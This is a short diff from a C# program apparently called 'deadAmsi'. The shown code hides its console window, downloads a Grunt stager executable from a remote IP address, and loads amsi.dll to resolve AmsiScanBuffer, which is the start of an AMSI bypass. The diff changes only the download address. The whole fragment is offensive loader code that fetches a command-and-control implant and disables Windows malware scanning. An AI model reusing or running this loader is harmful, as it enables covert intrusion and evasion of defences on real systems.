@@ -13,7 +13,7 @@ namespace deadAmsi
             var handle = Win32.GetConsoleWindow();
             Win32.ShowWindow(handle, SW_HIDE);
             var client = new WebClient();
-            var gruntStager = client.DownloadData("http://64.202.191.14/deadGrunt.exe");
+            var gruntStager = client.DownloadData("http://10.0.0.1/deadGrunt.exe");
             client.Dispose();
             var amsiDll = Win32.LoadLibrary("amsi.dll");
             var asbAddress = Win32.GetProcAddress(amsiDll, "AmsiScanBuffer");
